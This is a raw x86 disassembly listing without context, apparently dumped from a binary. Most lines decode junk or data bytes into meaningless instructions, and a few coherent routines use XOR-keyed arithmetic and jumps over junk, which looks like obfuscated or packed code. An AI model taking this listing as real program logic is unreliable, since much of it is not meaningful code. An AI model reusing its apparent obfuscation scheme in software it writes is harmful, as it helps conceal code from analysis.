  40c023:	fistp  QWORD PTR [esi-0x4b618568]
  40c029:	inc    eax
  40c02a:	jb     0x40c02f
  40c02c:	scas   al,BYTE PTR es:[edi]
  40c02d:	xor    al,0x28
  40c02f:	adc    al,0x6
  40c031:	mov    al,ds:0x6afc2267
  40c036:	leave  
  40c037:	mov    bl,0x36
  40c039:	test   eax,0xc8f1a8ad
  40c03e:	loopne 0x40c098
  40c040:	cmovge edx,DWORD PTR [ecx]
  40c043:	xchg   edi,eax
  40c044:	bound  esi,QWORD PTR [esi-0x61]
  40c047:	and    al,0x31
  40c049:	frstor [ecx]
  40c04b:	jecxz  0x40c0bc
  40c04d:	bound  esp,QWORD PTR [edi+0x0]
  40c050:	lahf   
  40c051:	mov    dh,0xc4
  40c053:	mov    esi,0xe5b88c86
  40c058:	loope  0x40c0b9
  40c05a:	jnp    0x40c0a2
  40c05c:	jg     0x40c017
  40c05e:	cmp    dl,bl
  40c060:	push   ebx
  40c061:	sbb    esp,eax
  40c063:	mov    BYTE PTR [edx+ebp*4+0x66],ch
  40c067:	mul    BYTE PTR [edx+esi*2-0x45]
  40c06b:	mov    bl,0x4b
  40c06d:	ficomp WORD PTR [ecx+eax*4-0x63]
  40c071:	mov    esi,0xa165e632
  40c076:	in     eax,0x3e
  40c078:	jecxz  0x40c0ac
  40c07a:	dec    ebp
  40c07b:	jle    0x40c00e
  40c07d:	fldenv [esi]
  40c07f:	fidivr DWORD PTR [edx+0x510859b9]
  40c085:	pop    es
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	inc    ebx
  40c0e1:	mov    BYTE PTR [ebx],bh
  40c0e3:	repz loope 0x40c11b
  40c0e6:	jle    0x40c166
  40c0e8:	mov    dh,0x7e
  40c0ea:	jle    0x40c16a
  40c0ec:	dec    esp
  40c0ed:	mov    WORD PTR [eax-0x32],?
  40c0f0:	popa   
  40c0f1:	aad    0x6c
  40c0f3:	sbb    dl,BYTE PTR [eax]
  40c0f5:	push   ss
  40c0f6:	outs   dx,BYTE PTR ds:[esi]
  40c0f7:	and    eax,0xe80889df
  40c0fc:	pusha  
  40c0fd:	xor    ebp,DWORD PTR ds:0x3576463f
  40c103:	sub    ecx,ebx
  40c105:	or     bl,BYTE PTR [eax]
  40c107:	push   ss
  40c108:	add    eax,0x1cf2f725
  40c10d:	mov    edx,0xcf90789f
  40c112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c113:	and    BYTE PTR [bp+si+0x28e4],bh
  40c118:	outs   dx,DWORD PTR ds:[esi]
  40c119:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c11b:	or     ebx,DWORD PTR [ebx-0x16eecf99]
  40c121:	push   ss
  40c122:	test   DWORD PTR [edx-0x1a04e0df],0x3a5a3b44
  40c12c:	fdivr  DWORD PTR [edi]
  40c12e:	aad    0xac
  40c130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c131:	add    BYTE PTR [edx],ch
  40c133:	int3   
  40c134:	inc    DWORD PTR [edx+0x6f8157f0]
  40c13a:	fisubr DWORD PTR [ebx+0x4cbe7474]
  40c140:	cmp    DWORD PTR [eax-0x1f],esi
  40c143:	not    BYTE PTR [ebx+0x74e1ed5e]
  40c149:	add    DWORD PTR [esi+0xb],ecx
  40c14c:	(bad)  
  40c14e:	(bad)  
  40c14f:	cs push ecx
  40c151:	int    0x6
  40c153:	xor    dh,BYTE PTR [ebx-0x1d]
  40c156:	pop    edx
  40c157:	es stc 
  40c159:	mov    esi,0x1adf1928
  40c15e:	jle    0x40c0e9
  40c160:	inc    edx
  40c161:	mov    ds:0xc770d05d,al
  40c166:	sub    al,0x4
  40c168:	out    dx,eax
  40c169:	sbb    eax,0xfa14b48
  40c16e:	push   ebx
  40c16f:	xor    al,0x3a
  40c171:	push   ebp
  40c172:	cdq    
  40c173:	and    eax,0xc87418ac
  40c178:	pusha  
  40c179:	fwait
  40c17a:	jle    0x40c118
  40c17c:	mov    bh,bl
  40c17e:	pop    ebx
  40c17f:	ficom  DWORD PTR [esi-0xdd63efd]
  40c185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c186:	push   edx
  40c187:	loopne 0x40c130
  40c189:	adc    DWORD PTR [edx-0x2edfe94f],ebp
  40c18f:	xchg   edi,eax
  40c190:	test   al,0x49
  40c192:	aad    0xc6
  40c194:	(bad)  
  40c195:	mul    BYTE PTR [ecx+0x8]
  40c198:	and    BYTE PTR [ebx],bl
  40c19a:	inc    ebx
  40c19b:	mov    ah,0x92
  40c19d:	ret    
  40c19e:	or     BYTE PTR [esi+edi*2+0x19],dl
  40c1a2:	std    
  40c1a3:	stos   BYTE PTR es:[edi],al
  40c1a4:	jmp    0xa273:0x8766ae44
  40c1ab:	jmp    0x8923abb8
  40c1b0:	cmp    ch,BYTE PTR [esi+eiz*4+0x34]
  40c1b4:	lea    ecx,[edx+ecx*1+0x32729f]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx+0xd6e08ce]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	mov    al,ds:0x8737ab21
  40c1f1:	adc    BYTE PTR [ecx-0x46],dl
  40c1f4:	inc    edx
  40c1f5:	and    eax,0x173a1bbb
  40c1fa:	mov    al,0xa0
  40c1fc:	stos   DWORD PTR es:[edi],eax
  40c1fd:	arpl   cx,dx
  40c1ff:	xor    eax,0x477d553d
  40c204:	jmp    0x98e8:0xa89f97cc
  40c20b:	je     0x40c24c
  40c20d:	jmp    0x2635:0x56304d53
  40c214:	arpl   WORD PTR [edx-0x22],bp
  40c217:	jbe    0x40c24d
  40c219:	pop    esp
  40c21a:	mov    dl,0x40
  40c21c:	je     0x40c243
  40c21e:	xchg   ebp,eax
  40c21f:	or     ebx,DWORD PTR [ebx+0x333460f2]
  40c225:	add    eax,0x14
  40c228:	cmp    al,0xe8
  40c22a:	cld    
  40c22b:	cmp    esi,DWORD PTR [eax]
  40c22d:	out    0xb8,al
  40c22f:	push   esp
  40c230:	xor    al,dl
  40c232:	add    eax,0xbe314852
  40c237:	test   BYTE PTR [ecx+0x66],bh
  40c23a:	push   esp
  40c23b:	jno    0x40c29b
  40c23d:	and    cl,ch
  40c23f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c240:	js     0x40c1c4
  40c242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c243:	jecxz  0x40c2ba
  40c245:	mov    ds:0xe0c5d0a9,eax
  40c24a:	jp     0x40c2ac
  40c24c:	add    DWORD PTR [ebx-0x34],ecx
  40c24f:	adc    ch,BYTE PTR [esi+ebx*8-0x4027aa80]
  40c256:	sub    eax,0x9b4fe66d
  40c25b:	cs cmp eax,0x2777de6b
  40c261:	xchg   ebx,eax
  40c262:	in     eax,dx
  40c263:	add    eax,0x4cabddb0
  40c268:	mov    dl,0xdc
  40c26a:	mov    al,0x65
  40c26c:	xor    cl,bh
  40c26e:	aam    0xe7
  40c270:	push   esp
  40c271:	clc    
  40c272:	adc    ebp,DWORD PTR [edi+0x42508137]
  40c278:	and    eax,0x2b2ea387
  40c27d:	adc    eax,0xf7a2c54c
  40c282:	imul   esp,DWORD PTR [esi+0x10],0x67
  40c286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c287:	(bad)  
  40c288:	fidivr DWORD PTR [ecx-0x3a]
  40c28b:	bound  ebx,QWORD PTR [esi]
  40c28d:	xchg   ebx,eax
  40c28e:	fild   QWORD PTR [ebx]
  40c290:	imul   BYTE PTR [ebx]
  40c292:	aam    0x8b
  40c294:	xor    BYTE PTR [esi-0x22],cl
  40c297:	es in  eax,0xe2
  40c29a:	fwait
  40c29b:	stos   DWORD PTR es:[edi],eax
  40c29c:	jg     0x40c2d4
  40c29e:	and    ebx,edx
  40c2a0:	mov    ecx,0x957f6e0a
  40c2a5:	xchg   edx,eax
  40c2a6:	popf   
  40c2a7:	mov    ebp,0xbcf450dd
  40c2ac:	mov    ah,0xd6
  40c2ae:	fisttp QWORD PTR [ebx+0xe]
  40c2b1:	cmp    BYTE PTR [eax+0x6a],bh
  40c2b4:	mov    eax,DWORD PTR [ebp-0x4]
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	inc    eax
  40c2da:	stos   DWORD PTR es:[edi],eax
  40c2db:	fimul  WORD PTR [ecx+esi*2-0x35]
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	inc    esi
  40c2e6:	call   0x45da:0xe036b1cd
  40c2ed:	pusha  
  40c2ee:	icebp  
  40c2ef:	sub    esp,edx
  40c2f1:	loope  0x40c2f7
  40c2f3:	sbb    al,BYTE PTR [esp+ebx*1-0x12]
  40c2f7:	cld    
  40c2f8:	inc    esi
  40c2f9:	and    BYTE PTR [ecx-0x45],bl
  40c2fc:	popf   
  40c2fd:	mov    ds:0xe409f312,al
  40c302:	ror    BYTE PTR [ecx+edi*8],cl
  40c305:	push   ds
  40c306:	dec    ebp
  40c307:	retf   
  40c308:	lods   eax,DWORD PTR gs:[esi]
  40c30a:	dec    ebx
  40c30b:	aaa    
  40c30c:	pop    eax
  40c30d:	loopne 0x40c359
  40c30f:	adc    edi,DWORD PTR [edi+0x62a91b12]
  40c315:	sbb    eax,0xf63e48cd
  40c31a:	rcr    BYTE PTR [eax+0x4e],1
  40c31d:	push   esi
  40c31e:	sti    
  40c31f:	cmp    al,0xbc
  40c321:	dec    ebp
  40c322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c323:	ins    DWORD PTR es:[edi],dx
  40c324:	sti    
  40c325:	or     BYTE PTR [ebx],ch
  40c327:	iret   
  40c328:	sub    al,0xd2
  40c32a:	dec    esp
  40c32b:	sar    DWORD PTR [ebp+eiz*1+0x5],1
  40c32f:	mov    WORD PTR [eax],ds
  40c331:	test   DWORD PTR [edx-0x2c],edx
  40c334:	sbb    BYTE PTR [ecx-0x40c7bd85],ch
  40c33a:	xchg   edi,eax
  40c33b:	or     DWORD PTR [edx],esp
  40c33d:	imul   eax,edx,0xffffffa3
  40c340:	xor    BYTE PTR [esi],cl
  40c342:	stos   BYTE PTR es:[edi],al
  40c343:	mov    bh,0xe
  40c345:	ficom  WORD PTR [eax-0x42]
  40c348:	mov    al,ds:0x83240076
  40c34d:	in     al,dx
  40c34e:	jnp    0x40c374
  40c350:	xor    al,BYTE PTR [edx+0x9]
  40c353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c354:	bound  edx,QWORD PTR [ebx+0x73]
  40c357:	(bad)  
  40c358:	fistp  WORD PTR [ecx-0x3c]
  40c35b:	adc    dl,BYTE PTR [eax+ecx*8+0x4399be25]
  40c362:	or     bh,BYTE PTR [ebx-0x35]
  40c365:	pop    ss
  40c366:	in     al,0x21
  40c368:	pop    esi
  40c369:	je     0x40c390
  40c36b:	cmc    
  40c36c:	sub    al,0x59
  40c36e:	xor    al,0xe6
  40c370:	xchg   ebx,eax
  40c371:	pop    es
  40c372:	aas    
  40c373:	lahf   
  40c374:	scas   eax,DWORD PTR es:[edi]
  40c375:	bnd ja 0x40c318
  40c378:	and    al,0x53
  40c37a:	(bad)  
  40c37b:	pop    eax
  40c37c:	(bad)  
  40c37d:	rcl    BYTE PTR [eax-0x56d7c7d7],1
  40c383:	xchg   esp,eax
  40c384:	fbld   TBYTE PTR [ebp+0x1a550502]
  40c38a:	fwait
  40c38b:	push   0xc1b78a29
  40c390:	fist   WORD PTR [ebx]
  40c392:	cdq    
  40c393:	out    dx,eax
  40c394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c395:	sub    al,0xc4
  40c397:	retf   
  40c398:	jmp    0x40c327
  40c39a:	neg    BYTE PTR [edi-0x33fa7f20]
  40c3a0:	adc    eax,0x3564aa36
  40c3a5:	push   ds
  40c3a6:	xor    dh,dl
  40c3a8:	loopne 0x40c397
  40c3aa:	sub    al,0x53
  40c3ac:	in     eax,0xff
  40c3ae:	shl    DWORD PTR [ebx],cl
  40c3b0:	fucomi st,st(1)
  40c3b2:	loopne 0x40c3b4
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x692e5fee,ecx
  40c3c3:	ins    DWORD PTR es:[edi],dx
  40c3c4:	mov    al,ds:0x7ecb4959
  40c3c9:	jle    0x40c381
  40c3cb:	jle    0x40c44b
  40c3cd:	jle    0x40c3b4
  40c3cf:	out    dx,eax
  40c3d0:	mov    ah,BYTE PTR [ebp-0x5f]
  40c3d3:	mov    ebx,0xa93a347a
  40c3d8:	retf   0x1fe4
  40c3db:	add    al,0x52
  40c3dd:	and    al,0x94
  40c3df:	sbb    bh,al
  40c3e1:	sbb    DWORD PTR [edi-0x552d7796],0x7c
  40c3e8:	push   edi
  40c3e9:	in     eax,dx
  40c3ea:	sbb    BYTE PTR [ecx+0x1a84dfc8],ah
  40c3f0:	and    BYTE PTR [ebx],al
  40c3f2:	enter  0x140b,0x97
  40c3f6:	sub    eax,0xae1eec0
  40c3fb:	push   esp
  40c3fc:	xchg   DWORD PTR [edi+ecx*4],ecx
  40c3ff:	jecxz  0x40c387
  40c401:	add    edi,eax
  40c403:	call   DWORD PTR [ebp-0x1886bf1b]
  40c409:	jmp    0x42dc:0xd2c55d85
  40c410:	cmp    DWORD PTR [edx],eax
  40c412:	aad    0x53
  40c414:	dec    edx
  40c415:	fnstenv [ecx+0x36a6bee0]
  40c41b:	jl     0x40c42c
  40c41d:	fwait
  40c41e:	shl    ebx,cl
  40c420:	cdq    
  40c421:	add    ch,BYTE PTR [edi+0x55]
  40c424:	add    BYTE PTR [edx-0x5f11c41e],cl
  40c42a:	in     al,dx
  40c42b:	xor    al,BYTE PTR [edx]
  40c42d:	add    al,0x1c
  40c42f:	add    al,0x9e
  40c431:	fcmovnbe st,st(1)
  40c433:	adc    esp,DWORD PTR [ebx]
  40c435:	jbe    0x40c44c
  40c437:	mov    cl,0xa9
  40c439:	push   0xfffffff2
  40c43b:	out    0x50,al
  40c43d:	retf   
  40c43e:	mov    ds:0x18547b54,eax
  40c443:	aaa    
  40c444:	mov    bl,0x86
  40c446:	out    dx,eax
  40c447:	scas   eax,DWORD PTR es:[edi]
  40c448:	(bad)  
  40c449:	mov    eax,ds:0x5be9afa4
  40c44e:	sub    cl,bh
  40c450:	scas   eax,DWORD PTR es:[edi]
  40c451:	or     BYTE PTR [ebp+edx*1-0x13cb3fac],bl
  40c458:	mov    esi,0x935d213e
  40c45d:	cmp    BYTE PTR gs:[edi-0xe150],dh
  40c464:	ficom  DWORD PTR [eax]
  40c466:	es jmp 0x40c4b8
  40c469:	idiv   cl
  40c46b:	retf   
  40c46c:	addr16 int 0xcd
  40c46f:	mov    ebp,0xfa984bf2
  40c474:	call   0x744de569
  40c479:	inc    esi
  40c47a:	cmp    eax,0xe8f4e72f
  40c47f:	dec    ebp
  40c480:	into   
  40c481:	lods   al,BYTE PTR ds:[esi]
  40c482:	outs   dx,BYTE PTR ds:[esi]
  40c483:	ss repz pop ss
  40c486:	jge    0x40c4be
  40c488:	mov    DWORD PTR [eax],edx
  40c48a:	(bad)  
  40c48b:	cmp    ebx,DWORD PTR [ecx-0x57]
  40c48e:	(bad)  
  40c48f:	scas   al,BYTE PTR es:[edi]
  40c490:	mul    DWORD PTR ds:0xe5dd9e84
  40c496:	inc    ebx
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs xchg ebx,eax
  40c4ac:	mov    ds:0xc881b09a,al
  40c4b1:	jle    0x40c531
  40c4b3:	mov    dh,0x7e
  40c4b5:	jle    0x40c535
  40c4b7:	test   al,0x11
  40c4b9:	popf   
  40c4ba:	mov    dl,0x62
  40c4bc:	arpl   WORD PTR [eax],bx
  40c4be:	pusha  
  40c4bf:	ds xor cl,ch
  40c4c2:	dec    ebp
  40c4c3:	pop    eax
  40c4c4:	sub    DWORD PTR [edi-0x3ee4e2b7],ecx
  40c4ca:	inc    ebp
  40c4cb:	jne    0x40c4e9
  40c4cd:	inc    esi
  40c4ce:	sbb    al,bl
  40c4d0:	lahf   
  40c4d1:	jp     0x40c45b
  40c4d3:	jge    0x40c4a0
  40c4d5:	retf   
  40c4d6:	into   
  40c4d7:	pop    es
  40c4d8:	push   cs
  40c4d9:	mov    esp,0xded03bc
  40c4de:	stc    
  40c4df:	push   esp
  40c4e0:	ds cld 
  40c4e2:	pop    es
  40c4e3:	(bad)  
  40c4e5:	js     0x40c4a1
  40c4e7:	nop
  40c4e8:	pop    ss
  40c4e9:	in     al,0xb1
  40c4eb:	mov    ah,0x4e
  40c4ed:	out    dx,al
  40c4ee:	inc    eax
  40c4ef:	and    DWORD PTR [ebp-0x4f],esp
  40c4f2:	and    eax,0x71b7c2b2
  40c4f7:	dec    ebp
  40c4f8:	or     cl,0x5d
  40c4fb:	inc    edi
  40c4fc:	push   ds
  40c4fd:	pop    esi
  40c4fe:	sub    BYTE PTR [esi-0x26],dl
  40c501:	xor    al,0x3b
  40c503:	inc    edx
  40c504:	inc    esi
  40c505:	xor    DWORD PTR [ecx-0x15d1ffbf],ebx
  40c50b:	pusha  
  40c50c:	rcl    ebx,cl
  40c50e:	adc    al,dl
  40c510:	adc    al,0x99
  40c512:	add    DWORD PTR [ebp+edx*8+0xc],ecx
  40c516:	push   edx
  40c517:	pop    eax
  40c518:	sub    DWORD PTR [ebp-0x50],esi
  40c51b:	adc    eax,0x879b3c43
  40c520:	jl     0x40c4b6
  40c522:	fnstsw WORD PTR [ebp+0x32d3b86f]
  40c528:	mov    edx,0x26e7655b
  40c52d:	dec    ebx
  40c52e:	inc    edx
  40c52f:	pusha  
  40c530:	xor    al,0x91
  40c532:	adc    dl,cl
  40c534:	pop    eax
  40c535:	imul   edx,DWORD PTR [ebx-0x776e9f51],0x9870e8d1
  40c53f:	pop    ecx
  40c540:	imul   esp,DWORD PTR [esp+ebx*2-0x4abe5af1],0xffffffe4
  40c548:	mov    bh,0xd6
  40c54a:	mov    cl,0x6b
  40c54c:	xchg   ebx,eax
  40c54d:	fild   WORD PTR [edi]
  40c54f:	lahf   
  40c550:	jmp    0x40c4f9
  40c552:	jle    0x40c522
  40c554:	int3   
  40c555:	popa   
  40c556:	lahf   
  40c557:	or     BYTE PTR [edi+0x26],cl
  40c55a:	std    
  40c55b:	mov    ebx,0xe79abffa
  40c560:	mov    dh,0x93
  40c562:	pop    eax
  40c563:	push   eax
  40c564:	data16 jmp 0x40c515
  40c567:	mov    al,0x22
  40c569:	push   ecx
  40c56a:	std    
  40c56b:	mov    ebp,0x66cd196b
  40c570:	pop    edx
  40c571:	push   edx
  40c572:	sub    DWORD PTR [eax+0x3e],edx
  40c575:	cs daa 
  40c577:	imul   edx,DWORD PTR ds:0x37108440,0x840f7010
  40c581:	std    
  40c582:	add    BYTE PTR [eax],al
  40c584:	add    BYTE PTR [edx+0x6a590a6a],dl
  40c58a:	add    al,0x5b
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0x31e541c7
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	mul    BYTE PTR [esi+esi*4]
  40c5b3:	test   al,0x83
  40c5b5:	xchg   edx,eax
  40c5b6:	pop    esp
  40c5b7:	and    bh,BYTE PTR [eax-0x65224c1e]
  40c5bd:	es test al,0xcb
  40c5c0:	push   0x3e0137c8
  40c5c5:	gs jmp 0x9976a6b1
  40c5cb:	and    cl,0xdf
  40c5ce:	mov    esp,0xd8aaf392
  40c5d3:	add    ecx,DWORD PTR [edi]
  40c5d5:	sbb    edi,esp
  40c5d7:	leave  
  40c5d8:	cld    
  40c5d9:	mov    eax,ds:0xe0f4d5d1
  40c5de:	fldcw  WORD PTR [edx-0x2a]
  40c5e1:	loopne 0x40c5e6
  40c5e3:	scas   eax,DWORD PTR es:[edi]
  40c5e4:	xor    DWORD PTR [ebp+0x2fd01dd1],0xffffff86
  40c5eb:	pushf  
  40c5ec:	pop    edi
  40c5ed:	inc    edx
  40c5ee:	imul   ecx,ebp,0xffffffb1
  40c5f1:	add    al,0x71
  40c5f3:	aaa    
  40c5f4:	out    0x21,eax
  40c5f6:	ret    
  40c5f7:	pop    edx
  40c5f8:	shl    DWORD PTR [edx+0x1d5700b],0xc7
  40c5ff:	pop    esi
  40c600:	jg     0x40c67d
  40c602:	jle    0x40c641
  40c604:	int    0x8c
  40c606:	or     al,BYTE PTR [eax-0x48ba1ee9]
  40c60c:	sub    BYTE PTR [edi+ecx*2+0x58],ah
  40c610:	xchg   ebp,eax
  40c611:	inc    ebp
  40c612:	ins    DWORD PTR es:[edi],dx
  40c613:	ins    DWORD PTR es:[edi],dx
  40c614:	sub    bh,BYTE PTR [esi+0x4d36ac7f]
  40c61a:	rcl    BYTE PTR [ecx+ebp*2-0x1e],0xcc
  40c61f:	cli    
  40c620:	or     ebp,ebp
  40c622:	mov    dl,BYTE PTR [edx-0x58]
  40c625:	loop   0x40c66f
  40c627:	popa   
  40c628:	fidivr DWORD PTR [edx-0x13]
  40c62b:	stos   DWORD PTR es:[edi],eax
  40c62c:	loope  0x40c5fb
  40c62e:	and    al,0x9d
  40c630:	xchg   edi,eax
  40c631:	dec    esi
  40c632:	xchg   esi,eax
  40c633:	sbb    al,0x2c
  40c635:	adc    ah,BYTE PTR [esi-0x323d13d8]
  40c63b:	ret    
  40c63c:	jns    0x40c653
  40c63e:	jae    0x40c5e4
  40c640:	loop   0x40c5e1
  40c642:	rcr    BYTE PTR [edi],0xb6
  40c645:	sbb    eax,0xbfc1f121
  40c64a:	stos   BYTE PTR es:[edi],al
  40c64b:	sub    bh,BYTE PTR [esi+0x45]
  40c64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c64f:	ficom  WORD PTR [edx+0x6f]
  40c652:	and    eax,0x33a36be8
  40c657:	pop    ebp
  40c658:	repnz pop ebx
  40c65a:	push   edi
  40c65b:	inc    DWORD PTR [edx+0x6ccdd5e7]
  40c661:	js     0x40c652
  40c663:	(bad)  
  40c664:	inc    BYTE PTR [ebx-0x6a]
  40c667:	or     bh,dl
  40c669:	mov    ch,0x61
  40c66b:	pop    ebx
  40c66c:	jb     0x40c6ac
  40c66e:	or     eax,0xa6bf9c46
  40c673:	nop
  40c674:	mov    edi,0x49e1bbcf
  40c679:	mov    eax,DWORD PTR [ebp-0x1c]
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
